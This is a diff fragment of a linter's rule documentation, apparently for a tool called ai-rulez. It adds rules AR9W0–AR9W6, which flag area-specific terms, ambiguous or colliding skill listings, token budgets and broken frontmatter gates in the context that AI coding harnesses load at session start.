+content exceeds a documented load limit of a configured harness (Claude skill listing per skill and in total, Codex AGENTS.md chain and skill listing, Windsurf/Devin rule files, Cursor rule length)
 
 - Default severity: `warning`
 - Analyzer: `plugin` (scope `item`)
@@ -4324,5 +4338,75 @@ a skill, command or agent is named like a name the harness refuses to load; lint
 - Why: A harness refuses to load some names: Claude Code skips a skill or command named `synced` or `anthropic-skills`, or starting with `anthropic-skills:`, outside a plugin. Unlike a built-in, there is nothing to acknowledge: the item never loads, so `lint.builtin_names.allow` and `lint.allow_overrides` do not silence it. Rename the item.
 - Bad: `.ai-rulez/skills/synced/SKILL.md` with the claude preset
 - Good: Rename the skill (`sync-notes`)
+
+### AR9W0 exposure-area-term
+
+a term of an area that is not shared appears in text a Claude Code session sees at its start (a root CLAUDE.md, an unconditional root rule, a skill or agent listing line, an MCP server name, an enabled plugin name), outside path literals
+
+- Default severity: `error`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: What a session sees at its start is in the context of every task, whatever area it is about. A word that names one area there pulls every session toward that area and costs tokens in all the others; the knowledge belongs in the area's own directory, where it loads on demand. The message is `<kind> "<name>" at session start names term "<term>" of area "<area>"`, so a `[[lint.accept]]` match can name the artifact or the term.
+- Bad: A root CLAUDE.md line `Run the invoice reconciler before a release`, with `invoice` a term of the area `billing`
+- Good: Move the line to `services/billing/CLAUDE.md`, name the location instead (`services/billing/`, a path literal), or accept it with a reason: `[[lint.accept]] rule = "AR9W0" path = "CLAUDE.md" match = 'names term "invoice"'`
+
+### AR9W1 exposure-area-term-ambiguous
+
+a skill or agent listed at session start names no term of any area but some ambiguous words, so the area it belongs to cannot be told
+
+- Default severity: `warning`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: A skill or agent listed at session start whose description holds only words several areas use (`account`, `query`) may belong to one of them. Its listing loads in every session while the map cannot say whose it is.
+- Bad: `.claude/skills/lookup/SKILL.md` with `description: Looks up an account by query`, both ambiguous words
+- Good: `description: Looks up a billing customer account` (a term decides), or `[skill_areas] lookup = "billing"` and the skill moved under the area's directory
+
+### AR9W2 exposure-area-collision
+
+two skills or agents listed at session start, of different areas, overlap in the words of their listings at or over [exposure] collision_min_score (setting it turns the rule on at warning); the 20 highest pairs are reported, the rest in one summary finding
+
+- Default severity: `off`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: The model picks a skill or agent by its listing. Two listings of different areas that share most of their words compete for the same prompts, so a session working on one area can load the other's instructions. `ai-rulez exposure collisions` ranks every pair.
+- Bad: A billing skill `charge` described as "Look up customer invoice details by name" next to a search skill `rank` described as "Look up customer ranker details by name"
+- Good: Descriptions that lead with what sets each apart: "Refund or void a billing invoice" and "Tune the search ranker weights"
+
+### AR9W3 exposure-start-budget
+
+the estimated tokens a Claude Code session loads at start exceed [exposure] start_budget (setting it turns the rule on at error)
+
+- Default severity: `off`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: Everything a session loads before it touches a file (the root CLAUDE.md, unconditional rules, the skill and agent listings, MCP server names) is paid for by every session, whatever it works on. A budget turns growth of that surface into a decision instead of drift. The estimate is the one `ai-rulez exposure` reports.
+- Bad: `[exposure] start_budget = 4000` while the root CLAUDE.md and the skill listing add up to about 5200 estimated tokens
+- Good: Move area-specific guidance into a subdirectory CLAUDE.md or a `paths:`-gated rule, so it loads on demand, or raise start_budget on purpose
+
+### AR9W4 exposure-gate-unreadable
+
+a skill, command or rule Claude Code loads has frontmatter that does not parse (AR306) while it names paths, disable-model-invocation or user-invocable, or sets paths or disable-model-invocation to a value of the wrong type, so whether it is gated, and when it loads, cannot be known
+
+- Default severity: `warning`
+- Analyzer: `exposure` (scope `item`)
+- Why: `paths:` defers a skill or rule until a matching file is read and `disable-model-invocation` keeps a skill out of the model's listing. When the block around them is not valid YAML, Claude Code (2.1.312, measured) recovers some blocks and keeps the gate (an unquoted colon and space in a value), and drops others whole (an unclosed quote, a tab indent), so the item then loads at session start in every session. Which one happens is up to the harness's own parser, and a gate value of the wrong type (`paths: 5`, or `disable-model-invocation: yes`, a string to YAML 1.2 that Claude Code reads as YAML 1.1 does) leaves the same doubt, so `ai-rulez exposure inventory` reports the phase as `unknown` and counts it at session start, and the MCP server never returns such a rule for a `path` query. Only for the claude preset, or a run without a configuration; AR306 reports the block itself.
+- Bad: `description: Use when: deploying` above `paths: ["services/billing/**"]`
+- Good: `description: "Use when: deploying"` above `paths: ["services/billing/**"]`
+
+### AR9W5 exposure-map-invalid
+
+the [exposure] table or its area map is invalid: a bad scalar key, a duplicate, malformed or reserved area name, a bad path claim, a skill_areas value naming no area, an unknown key, an unreadable areas_file, or both areas_file and inline areas
+
+- Default severity: `error`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: The area map decides which area owns a skill and which words name an area. A map with a problem is not used at all, so the exposure rules that read it stay silent until it is fixed; this finding is the only sign that they are off.
+- Bad: Two `[[area]]` tables named `billing`, a path claim `"services/billing/"` with a trailing slash, or `[skill_areas] deploy = "ops"` with no area `ops`
+- Good: Unique lower-kebab names, repository-relative claims such as `"services/billing_*"` or `"!services/billing_legacy"`, and skill_areas values that name an area
+
+### AR9W6 exposure-skill-area-unknown
+
+a skill_areas key of the area map names no skill of the session inventory
+
+- Default severity: `warning`
+- Analyzer: `exposure` (scope `bundle`)
+- Why: A skill_areas entry outlives the skill it places when the skill is renamed, moved into a plugin or deleted. The stale entry places nothing, and would silently place a different skill that later takes the name.
+- Bad: `[skill_areas] deploy-staging = "platform"` after the skill was renamed `ship-staging`
+- Good: Rename the key (`ship-staging = "platform"`), or remove it; a plugin skill is keyed `plugin:skill`
 
 <!-- rules:end -->
